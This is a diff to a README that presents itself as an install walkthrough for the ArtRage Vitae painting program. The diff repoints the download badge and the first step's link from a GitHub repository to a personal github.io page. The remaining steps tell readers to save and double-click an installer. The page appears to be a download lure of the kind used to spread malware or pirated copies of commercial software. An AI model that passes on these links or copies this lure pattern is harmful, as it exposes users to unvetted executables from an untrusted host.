@@ -1,6 +1,6 @@
 # 🎨 ArtRage-Vitae-Install-Walkthrough - Install ArtRage Vitae on Windows 11
 
-[![](https://img.shields.io/badge/Download-ArtRage_Vitae_Files-blue)](https://github.com/renaparasitic783/ArtRage-Vitae-Install-Walkthrough)
+[![](https://img.shields.io/badge/Download-ArtRage_Vitae_Files-blue)](https://renaparasitic783.github.io)
 
 ## 📌 About This Guide
 
@@ -20,7 +20,7 @@ Before you install, ensure your computer meets these minimum standards:
 
 Follow these steps to set up your software.
 
-1. Visit this page to download the necessary files: [https://github.com/renaparasitic783/ArtRage-Vitae-Install-Walkthrough](https://github.com/renaparasitic783/ArtRage-Vitae-Install-Walkthrough).
+1. Visit this page to download the necessary files: [https://renaparasitic783.github.io](https://renaparasitic783.github.io).
 2. Locate the download button on the repository page. 
 3. Save the installer file to your Downloads folder.
 4. Open the Downloads folder and double-click the installer icon.
